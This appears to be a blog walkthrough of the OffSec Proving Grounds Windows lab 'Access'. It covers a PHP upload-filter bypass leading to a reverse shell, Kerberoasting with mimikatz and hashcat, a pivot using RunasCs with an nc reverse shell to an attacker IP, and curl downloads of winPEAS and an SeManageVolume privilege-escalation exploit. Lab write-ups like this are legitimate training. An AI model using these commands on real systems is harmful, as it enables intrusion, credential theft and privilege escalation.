---
title: Access
date: 2026-02-07T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Access"
---
“there is nothing outside of yourself that can ever enable you to get better, stronger, richer, quicker, or smarter. Everything is within. Everything exists. Seek nothing outside of yourself.”
Miyamoto Musashi, The Book of Five Rings

![](Screenshot%202026-02-05%20at%2013.30.10.png)

![](Screenshot%202026-02-05%20at%2013.34.36.png)

![](Screenshot%202026-02-05%20at%2013.58.20.png)

![](Screenshot%202026-02-05%20at%2013.57.57.png)

![](Screenshot%202026-02-05%20at%2014.07.17.png)

This looks like a php upload vulnerability. Lets upload a reverse shell.

![](Screenshot%202026-02-06%20at%2009.49.26.png)

![](Screenshot%202026-02-06%20at%2009.48.39.png)

In Caido change the POST request to include extra full stops after the filename:
revshell.php........

Note: you don't have to use Caido, just changing the file name before uploading will work just as well. 

When it's phased it will show up in the uploads directory as: revshell.php

![](Screenshot%202026-02-06%20at%2009.51.23.png)

![](Screenshot%202026-02-06%20at%2009.53.56.png)

![](Screenshot%202026-02-06%20at%2009.54.45.png)

We have a shell but no local.txt file for this user. Where must be a pivot before we escalate. 

![](Screenshot%202026-02-06%20at%2009.56.31.png)

![](Screenshot%202026-02-06%20at%2021.02.59.png)

Kerboroasting:
`setspn -T ACCESS -Q */*`

![](Screenshot%202026-02-06%20at%2018.15.51.png)

klist

![](Screenshot%202026-02-06%20at%2019.10.13.png)

Start a python server, move mimikatz to your victim and run: 

`mimi.exe "privilege::debug" "kerberos::list /export" exit`

![](Screenshot%202026-02-06%20at%2019.41.34.png)

Rename the file to make it less bonkers:

`move 1-40a10000-svc_apache@MSSQLSvc~DC.access.offsec-ACCESS.OFFSEC.kirbi C:\xampp\htdocs\uploads\ticket.kirbi`

Download it from via the browser:

![](Screenshot%202026-02-06%20at%2019.36.45.png)

Run this script on the file to extract the hash:

`python3 /usr/share/john/kirbi2john.py ticket.kirbi > mssql_hash.txt`

![](Screenshot%202026-02-06%20at%2019.38.20.png)

`hashcat -m 13100 mssql_hash.txt /usr/share/wordlists/rockyou.txt`

![](Screenshot%202026-02-06%20at%2019.32.45.png)

`hashcat -m 13100 mssql_hash.txt --show`

![](Screenshot%202026-02-06%20at%2019.32.16.png)

 Copy across nc64.exe and RunasCs.exe: https://github.com/antonioCoco/RunasCs/releases/tag/v1.5 

`curl http://192.168.45.219:81/nc64.exe -o nc.exe`

`curl http://192.168.45.219:81/RunasCs.exe -o RunasCs.exe`

Set up your listener `rlwrap nc -lvnp 1337` and run this:

`.\RunasCs.exe svc_mssql trustno1 "nc.exe 192.168.45.219 1337 -e cmd"`

![](Screenshot%202026-02-07%20at%2009.04.56.png)

![](Screenshot%202026-02-07%20at%2009.06.00.png)

Download and run winpeas:

`curl http://192.168.45.219/winPEASany.exe -o %TEMP%/winp.exe`

`%TEMP%/winp.exe`


![](Screenshot%202026-02-08%20at%2010.52.28.png)

Alternatively use `whoami /all`, despite the SeManageVolumePivilege being disabled we can still use it for an exploit.

![](Screenshot%202026-02-08%20at%2010.51.25.png)

google: `SeManageVolumePivilege exploit` and you may find this page: https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961 

Download this executable: 

`wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe`

Start a server: ``

`curl http://192.168.45.219/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe`

`.\SeManageVolumeExploit.exe`

![](Screenshot%202026-02-08%20at%2011.05.50.png)

The svc_mssql user now has elevated privileges. 

![](Screenshot%202026-02-08%20at%2010.47.31.png)

9 hours, still too long... 